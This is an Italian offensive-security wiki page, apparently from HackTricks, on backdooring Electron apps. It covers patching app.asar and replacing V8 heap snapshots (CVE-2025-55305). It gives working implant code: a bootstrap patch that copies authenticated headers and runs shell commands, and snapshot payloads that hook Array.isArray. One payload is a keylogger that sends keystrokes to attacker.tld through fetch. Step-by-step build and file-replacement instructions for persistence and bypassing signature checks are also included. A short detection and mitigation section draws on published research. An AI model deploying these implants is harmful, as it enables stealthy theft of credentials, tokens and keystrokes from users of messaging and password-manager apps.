# Iniezione di codice locale e manomissione degli snapshot di Electron

{{#include ../../banners/hacktricks-training.md}}

## Iniezione di codice locale in Electron

Se puoi modificare o strumentare un'applicazione Electron installata localmente, potresti riuscire a farle eseguire JavaScript arbitrario. Vedi:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Per una superficie di debug locale di Node inspector o Chromium DevTools, vedi [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: impianti in ASAR/processo principale

Se ottieni **accesso in scrittura** alla directory delle risorse di un'app Electron, una tecnica di post-exploitation molto pratica consiste nel **modificare `app.asar`** (o l'entrypoint JS che carica) e aspettare che l'utente riavvii l'app. A differenza di una XSS limitata al renderer, il codice caricato dal **processo principale** viene eseguito nel **runtime Node.js** dell'app, quindi di solito può accedere al **filesystem**, avviare comandi, agganciare le API di Electron e ispezionare lo stato autenticato dell'applicazione.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Flusso di lavoro tipico:

1. Estrai `app.asar` e individua il vero file di bootstrap da `package.json` (`main`) o dalla logica di avvio esistente.
2. Aggiungi un piccolo loader nel **processo principale** (o un hook di preload/processo principale) e ricrea l'archivio.
3. Aspetta che l'applicazione venga avviata di nuovo e usa l'impianto per acquisire dati di runtime dopo che l'utente sblocca o accede all'app desktop.

Esempio minimo di patch al bootstrap:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Implicazioni pratiche:

- **Furto di dati da client attendibili**: una volta che l’app desktop decritta o carica i dati per l’utente, l’implant può leggerli dal runtime. Per questo i **client di messaggistica E2EE** (Signal/Slack/Mattermost) e i **vault/secret manager** restano obiettivi interessanti a livello di endpoint.
- **Abuso di sessioni/token**: gli implant Electron possono rubare cookie dell’app, bearer token, header delle richieste, file workspace o credenziali dei repository esposti al client in esecuzione (ad esempio, estensioni VS Code autenticate o integrazioni Git).
- **Pivoting nel contesto della vittima**: un’app modificata può inoltrare le richieste tramite la workstation della vittima, riutilizzando l’IP, il fingerprint TLS e la sessione dell’app della vittima, invece di limitarsi a esfiltrare token grezzi.

> [!NOTE]
> Se il target abilita **ASAR integrity** / **OnlyLoadAppFromAsar** o i **fuses** di Electron con hardening, potrebbe essere necessario un diverso primitivo di caricamento locale del codice (ad esempio, abuso dei fuse o snapshot tampering). Per altre opzioni di implant locale e dettagli sui fuse, consulta la pagina di injection specifica per macOS.

## Backdoor locale tramite V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Le app basate su Electron e Chromium deserializzano all’avvio uno snapshot V8 dell’heap precompilato (v8_context_snapshot.bin e, facoltativamente, browser_v8_context_snapshot.bin) per inizializzare ogni isolate V8 (main, preload, renderer). Storicamente, gli integrity fuse di Electron non consideravano questi snapshot contenuti eseguibili, che quindi sfuggivano sia all’applicazione dell’integrità basata sui fuse sia ai controlli di firma del codice del sistema operativo. Di conseguenza, sostituire lo snapshot in un’installazione scrivibile dall’utente permetteva di eseguire codice in modo furtivo e persistente all’interno dell’app, senza modificare i binari firmati o l’ASAR.<sup>[[2]](#references)</sup>

Punti chiave
- Lacuna nell’integrità: EnableEmbeddedAsarIntegrityValidation e OnlyLoadAppFromAsar convalidano il JavaScript dell’app all’interno dell’ASAR, ma non coprivano gli snapshot V8 dell’heap (CVE-2025-55305). Anche Chromium non verifica l’integrità degli snapshot.<sup>[[3]](#references)[[4]](#references)</sup>
- Prerequisiti dell’attacco: accesso in scrittura locale alla directory di installazione dell’app. È comune nei sistemi in cui le app Electron o i browser Chromium sono installati in percorsi scrivibili dall’utente (ad es., %AppData%\Local su Windows; /Applications con alcune limitazioni su macOS).
- Effetto: esecuzione affidabile di JavaScript dell’attaccante in qualsiasi isolate, sovrascrivendo un builtin usato frequentemente (un “gadget”), con conseguente persistenza ed evasione della verifica della firma del codice.
- Superficie interessata: app Electron (anche con i fuse abilitati) e browser basati su Chromium che caricano gli snapshot da percorsi scrivibili dall’utente.

Generare uno snapshot malevolo senza compilare Chromium
- Usare l’electron/mksnapshot precompilato per compilare un payload JS in uno snapshot e sovrascrivere il v8_context_snapshot.bin dell’applicazione.<sup>[[5]](#references)[[6]](#references)</sup>

Esempio di payload minimo (dimostrare l’esecuzione forzando un crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Instradamento del payload consapevole dell'isolate (esegue codice diverso nel main process e nel renderer)
- Rilevamento del main process: globali disponibili solo in Node, come process.pid, process.binding() o process.dlopen, sono presenti nell'isolate del main process.
- Rilevamento del browser/renderer: globali disponibili solo nel browser, come alert, sono disponibili quando si esegue il codice nel contesto di un documento.

Esempio di gadget che verifica una sola volta le funzionalità Node del main process
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC di furto di dati dal contesto renderer/browser (ad es., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Flusso operativo
1) Scrivi payload.js che sovrascrive un builtin comune (ad es., Array.isArray) e, facoltativamente, esegue branching per isolate.
2) Crea lo snapshot senza i sorgenti di Chromium:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Sovrascrivi i file snapshot dell’applicazione target:
   - v8_context_snapshot.bin (sempre utilizzato)
   - browser_v8_context_snapshot.bin (se è utilizzato il fuse LoadBrowserProcessSpecificV8Snapshot)
4) Avvia l’applicazione; il gadget viene eseguito ogni volta che viene usato il builtin scelto.

Note e considerazioni
- Bypass dei controlli di integrità/firma: i file snapshot non sono considerati eseguibili nativi dai controlli di code-signing e, storicamente, non erano coperti dai fuse di Electron né dai controlli di integrità di Chromium.
- Persistenza: sostituire lo snapshot in un’installazione scrivibile dall’utente in genere persiste ai riavvii dell’app e fa sembrare l’app legittima e firmata.
- Browser Chromium: lo stesso concetto di tampering si applica a Chrome e ai suoi derivati installati in percorsi scrivibili dall’utente. Chrome dispone di altre mitigazioni di integrità, ma esclude esplicitamente gli attacchi fisicamente locali dal proprio modello di minaccia.<sup>[[9]](#references)[[10]](#references)</sup>

Rilevamento e mitigazioni
- Considera gli snapshot contenuti eseguibili e includili nei controlli di integrità (correzione CVE-2025-55305).
- Preferisci percorsi di installazione scrivibili solo dagli amministratori; crea baseline e monitora gli hash di v8_context_snapshot.bin e browser_v8_context_snapshot.bin.
- Rileva le sovrascritture di builtin nelle prime fasi del runtime e le modifiche impreviste agli snapshot; genera un alert quando gli snapshot deserializzati non corrispondono ai valori previsti.

## References

- [1] [JS-Tap v3: Post-exploitation degli endpoint con implant JavaScript](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Eludere i controlli di integrità del codice per inserire backdoor locali in Signal, 1Password, Slack e altro](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Fuse di Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Integrità di ASAR in Electron](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [Snapshot personalizzati di avvio di V8](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: disabilitare il caricamento di codice non firmato (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [FAQ sulla sicurezza di Chrome: gli attacchi fisicamente locali non rientrano nell’ambito](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
